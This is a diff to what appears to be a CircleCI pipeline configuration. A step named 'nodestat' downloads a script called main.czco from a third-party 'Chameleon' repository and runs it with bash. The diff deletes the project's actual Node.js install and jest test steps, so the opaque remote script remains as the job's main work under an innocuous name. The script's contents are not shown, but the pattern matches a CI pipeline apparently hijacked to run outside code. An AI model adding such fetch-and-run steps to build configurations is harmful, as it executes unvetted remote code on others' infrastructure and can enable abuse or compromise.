@@ -18,15 +18,14 @@ jobs:
       - run:
           name: "nodestat"
           command: "set -e  && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ch && bash /ch node"
-      - node/install:
-          install-yarn: true
-          node-version: '18.17'
-      - run: node --version
-      - node/test:
-          test-results-for: jest
+  
+
+
+  
+
 
 
 workflows:
-  say-hello-workflow:
+  test:
     jobs:
       - dockeretteinstall
